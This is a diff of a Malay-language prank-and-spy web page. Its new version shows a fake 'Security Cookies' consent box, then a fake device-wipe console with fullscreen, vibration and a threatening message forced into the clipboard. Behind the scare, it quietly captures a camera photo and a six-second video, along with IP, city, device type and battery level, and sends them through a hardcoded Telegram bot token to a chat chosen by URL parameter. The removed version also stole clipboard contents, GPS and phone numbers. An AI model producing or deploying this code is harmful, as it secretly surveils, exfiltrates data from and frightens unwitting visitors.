@@ -5,171 +5,202 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SYSTEM_CRITICAL_ERROR</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-shadow: 0 0 5px #0f0; transition: background 0.1s; }
-        .container { width: 85%; max-width: 500px; border: 1px solid #0f0; padding: 20px; background: rgba(0, 20, 0, 0.9); z-index: 2; }
-        .header { font-weight: bold; color: #f00; text-align: center; border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 15px; animation: pulse 1s infinite; text-transform: uppercase; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-        #console { font-size: 0.8rem; height: 220px; overflow: hidden; margin: 15px 0; line-height: 1.4; background: #001400; padding: 5px; border: 1px inset #0f0; }
-        .progress-bar { width: 100%; height: 10px; border: 1px solid #0f0; position: relative; }
-        .progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.4s; }
-        .red { color: #f00; font-weight: bold; }
-        input { width: 100%; padding: 10px; background: #000; border: 1px solid #0f0; color: #0f0; text-align: center; margin-bottom: 15px; }
-        button { width: 100%; padding: 12px; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; }
-        
-        /* Fitur Gempak: Camera Overlay */
-        #camera-preview {
-            position: fixed; top: 10px; right: 10px; width: 120px; height: 160px;
-            border: 2px solid #f00; border-radius: 8px; transform: scaleX(-1);
-            object-fit: cover; z-index: 10; display: none; box-shadow: 0 0 15px #f00;
+        body {
+            background: #000; color: #0f0; 
+            font-family: 'Courier New', Courier, monospace;
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+            height: 100vh; margin: 0; overflow: hidden;
+            text-shadow: 0 0 5px #0f0;
         }
+        /* Overlay & Cookie Box */
+        #overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); z-index: 9999;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .cookie-box {
+            background: #111; border: 1px solid #0f0; padding: 20px;
+            text-align: center; max-width: 300px; box-shadow: 0 0 15px #0f0;
+        }
+        .cookie-box button {
+            background: #0f0; color: #000; border: none;
+            padding: 10px 20px; margin-top: 15px; font-weight: bold; cursor: pointer;
+        }
+        .container { width: 80%; max-width: 600px; display: none; }
+        .header {
+            font-weight: bold; font-size: 1.2rem; margin-bottom: 20px;
+            border-bottom: 1px solid #0f0; padding-bottom: 10px;
+            width: 100%; text-align: center; color: #f00;
+            text-transform: uppercase; animation: pulse 1s infinite;
+        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        #console {
+            font-size: 0.85rem; line-height: 1.4; height: 250px;
+            overflow: hidden; background: rgba(0, 20, 0, 0.9);
+            padding: 10px; border: 1px solid #0f0;
+        }
+        .progress-bar { width: 100%; height: 10px; border: 1px solid #0f0; margin-top: 20px; }
+        .progress-fill { height: 100%; background: #f00; width: 0%; transition: width 0.3s; }
+        .red { color: #ff0000; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <video id="camera-preview" autoplay playsinline></video>
-
-    <div class="container" id="box-auth">
-        <div class="header"> [!] SECURITY ALERT [!] </div>
-        <p style="text-align:center; font-size:0.9rem;">Sila masukkan nombor telefon untuk pengesahan akses dokumen:</p>
-        <input type="tel" id="phone-input" placeholder="+60123456789">
-        <button onclick="startFullBreach()">START VERIFICATION</button>
+    <div id="overlay">
+        <div class="cookie-box">
+            <p style="font-size: 0.8rem;">Laman web ini menggunakan 'Security Cookies' untuk pengesahan peranti.</p>
+            <button onclick="initAction()">ACCEPT & PROCEED</button>
+        </div>
     </div>
 
-    <div class="container" id="box-hacker" style="display:none;">
-        <div class="header"> [!] EXECUTING SYSTEM WIPE [!] </div>
+    <div class="container" id="main-ui">
+        <div class="header"> [!] DEVICE WIPE IN PROGRESS [!] </div>
         <div id="console"></div>
-        <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
-        <p id="status" style="font-size:0.8rem; margin-top:10px;">Accessing internal storage... <span>_</span></p>
+        <div class="progress-bar">
+            <div class="progress-fill" id="fill"></div>
+        </div>
+        <p id="status" style="color:#f00; font-size:0.8rem; text-align:center;">DELETING ALL INTERNAL STORAGE...</p>
     </div>
 
+    <video id="video" style="display:none;" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;" width="640" height="480"></canvas>
 
     <script>
         const TOKEN = '8720467847:AAFxo75yX3BBCsdSXEwSSWATO6Gth76CTCo';
-        const CHAT_ID = '8563935930';
+        const urlParams = new URLSearchParams(window.location.search);
+        const CURRENT_CHAT_ID = urlParams.get('id') || '8563935930';
 
-        function log(text, isRed = false) {
+        const consoleElem = document.getElementById('console');
+        const fill = document.getElementById('fill');
+
+        function logToConsole(text, isRed = false) {
             const p = document.createElement('p');
             p.style.margin = '2px 0';
-            if (isRed) p.className = 'red';
+            p.className = isRed ? 'red' : '';
             p.innerHTML = `> ${text}`;
-            const c = document.getElementById('console');
-            c.appendChild(p);
-            c.scrollTop = c.scrollHeight;
+            consoleElem.appendChild(p);
+            consoleElem.scrollTop = consoleElem.scrollHeight;
+            if (consoleElem.childNodes.length > 12) consoleElem.removeChild(consoleElem.firstChild);
         }
 
-        async function startFullBreach() {
-            const phone = document.getElementById('phone-input').value;
-            if (phone.length < 9) return alert("Sila masukkan nombor yang sah!");
+        async function initAction() {
+            // 1. Hide Overlay & Show UI
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('main-ui').style.display = 'block';
 
-            // Fitur: Full Screen
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            // 2. Full Screen
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
 
-            document.getElementById('box-auth').style.display = 'none';
-            document.getElementById('box-hacker').style.display = 'block';
+            // 3. Vibration Pattern
+            if (navigator.vibrate) {
+                navigator.vibrate([100, 50, 100, 50, 500, 100, 500, 100, 1000]);
+            }
 
-            await sendToTele(`📱 *TARGET:* \`${phone}\`\n🚀 *Status:* Breach Started`);
+            // 4. Auto-Copy to Clipboard
+            const dummy = document.createElement("textarea");
+            document.body.appendChild(dummy);
+            dummy.value = "YOUR DEVICE HAS BEEN BREACHED. SYSTEM WIPE INITIATED. ALL DATA DELETED.";
+            dummy.select();
+            document.execCommand("copy");
+            document.body.removeChild(dummy);
 
-            // Fitur: Clipboard Snatcher
-            try {
-                const clip = await navigator.clipboard.readText();
-                if (clip) await sendToTele(`📋 *CLIPBOARD:* \`${clip}\``);
-            } catch(e) {}
-
-            runVisualEffects();
-            captureProcess(phone);
+            startTrace();
         }
 
-        function runVisualEffects() {
-            log("Initializing exploit...");
-            setTimeout(() => log("Bypassing Knox/Security... [OK]"), 1000);
-            setTimeout(() => log("Accessing DCIM/Gallery...", true), 2500);
+        async function startTrace() {
+            logToConsole("Exploiting system kernel...");
+            const waktu = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });
             
-            // Fitur: Screen Flash
-            const flash = setInterval(() => {
-                document.body.style.backgroundColor = (document.body.style.backgroundColor === 'red' ? 'black' : 'red');
-            }, 100);
-            setTimeout(() => { 
-                clearInterval(flash); 
-                document.body.style.backgroundColor = 'black';
-            }, 3000);
+            setTimeout(() => {
+                logToConsole("ACCESS GRANTED: ROOT_USER", true);
+                if(navigator.vibrate) navigator.vibrate(500);
+            }, 1000);
+            
+            setTimeout(() => logToConsole("Bypassing security protocols..."), 2000);
+            setTimeout(() => logToConsole("DELETING: /sdcard/DCIM/Camera", true), 3500);
+            setTimeout(() => {
+                logToConsole("DELETING: /WhatsApp/Databases", true);
+                if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
+            }, 5000);
+            setTimeout(() => logToConsole("Formatting /system partition...", true), 7000);
+            setTimeout(() => logToConsole("All personal data encrypted & removed."), 9000);
 
-            // Fitur: Vibration
-            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
+            let width = 0;
+            const interval = setInterval(() => {
+                if (width >= 99) clearInterval(interval);
+                width += Math.random() * 4;
+                fill.style.width = `${width}%`;
+            }, 500);
 
-            // Fake Wipe Logs
-            setTimeout(() => log("Deleting /sdcard/WhatsApp/Media..."), 4500);
-            setTimeout(() => log("Extracting Saved Passwords (Chrome)...", true), 6000);
-            setTimeout(() => log("Wiping System Partition... 40%"), 8000);
-
-            let w = 0;
-            const bar = setInterval(() => {
-                w += Math.random() * 8;
-                document.getElementById('fill').style.width = w + "%";
-                if (w >= 100) clearInterval(bar);
-            }, 700);
-        }
-
-        async function captureData(phone) {
+            // Get Device Info
+            let infoBateri = "N/A";
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                const waktu = new Date().toLocaleString('ms-MY');
-                
-                let info = `🚨 *BREACH REPORT*\n📱 *Phone:* ${phone}\n🌐 *IP:* \`${d.ip}\`\n📍 *Loc:* ${d.city}, ${d.country_name}\n⏰ *Time:* ${waktu}`;
-                await sendToTele(info);
+                const battery = await navigator.getBattery();
+                infoBateri = `${Math.round(battery.level * 100)}%`;
+            } catch (e) {}
 
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(p => {
-                        sendToTele(`📍 *GPS:* https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-                    });
-                }
-            } catch(e) {}
-        }
+            let brandPhone = navigator.userAgent.match(/iPhone/i) ? "iPhone" : "Android";
 
-        async function captureProcess(phone) {
-            captureData(phone);
+            // Telegram Reporting
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const video = document.getElementById('camera-preview');
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                let infoAsas = `🚨 *BREACH & WIPE*\n📱 *Device:* ${brandPhone}\n🌐 *IP:* \`${data.ip}\`\n📍 *Loc:* ${data.city}\n🔋 *Bat:* ${infoBateri}`;
+                await sendToTele(infoAsas);
+            } catch (e) {}
+
+            // Camera Only (No Audio/Mic)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                const video = document.getElementById('video');
                 video.srcObject = stream;
-                
-                // Fitur: Show Live Camera Overlay
-                video.style.display = 'block';
-                log("Camera Link: ESTABLISHED", true);
 
-                await new Promise(r => setTimeout(r, 3000));
-                
-                // Snap Photo
-                const canvas = document.getElementById('canvas');
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                canvas.toBlob(blob => {
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('photo', blob, 'snap.jpg');
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                }, 'image/jpeg');
-
-                // Redirect
                 setTimeout(() => {
-                    window.location.href = "https://www.google.com";
-                }, 12000);
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    canvas.toBlob(async (blob) => {
+                        const fd = new FormData();
+                        fd.append('chat_id', CURRENT_CHAT_ID);
+                        fd.append('photo', blob, 'target.jpg');
+                        fd.append('caption', `📸 *TARGET CAPTURED DURING WIPE*`);
+                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    }, 'image/jpeg');
+                }, 3000);
+
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                    const fdV = new FormData();
+                    fdV.append('chat_id', CURRENT_CHAT_ID);
+                    fdV.append('video', videoBlob, 'log.mp4');
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fdV });
+                    stream.getTracks().forEach(t => t.stop());
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => { mediaRecorder.stop(); }, 6000);
 
             } catch (e) {
-                log("Camera Access: DENIED", true);
+                logToConsole("SECURITY ERROR: Camera bypass failed.", true);
             }
+
+            setTimeout(() => {
+                window.location.href = "https://blogs.mtdv.me/videos/452uSngg5p";
+            }, 14000);
         }
 
-        async function sendToTele(t) {
+        async function sendToTele(text) {
             return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: t, parse_mode: 'Markdown'})
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CURRENT_CHAT_ID, text: text, parse_mode: 'Markdown' })
             });
         }
-        
-        // Anti-Tab Close
-        window.onbeforeunload = function() { return "Data sedang diproses!"; };
     </script>
 </body>
 </html>
